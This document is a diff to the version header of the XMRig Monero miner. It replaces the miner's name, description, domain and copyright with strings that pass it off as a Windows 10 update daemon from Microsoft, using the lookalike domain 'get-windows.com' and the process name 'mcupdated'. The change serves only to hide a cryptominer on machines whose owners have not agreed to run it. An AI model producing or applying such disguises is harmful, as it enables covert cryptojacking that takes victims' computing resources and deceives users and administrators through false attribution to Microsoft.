@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig miner"
+#define APP_ID        "mcupdated"
+#define APP_NAME      "Win10UpdateDaemonx86"
+#define APP_DESC      "Windows 10 update daemon (x86_64)"
 #define APP_VERSION   "6.19.1"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2023 xmrig.com"
-#define APP_KIND      "miner"
+#define APP_DOMAIN    "get-windows.com"
+#define APP_SITE      "get-windows.com"
+#define APP_COPYRIGHT "Copyright (C) 2023 microsoft.com"
+#define APP_KIND      "daemon"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  19
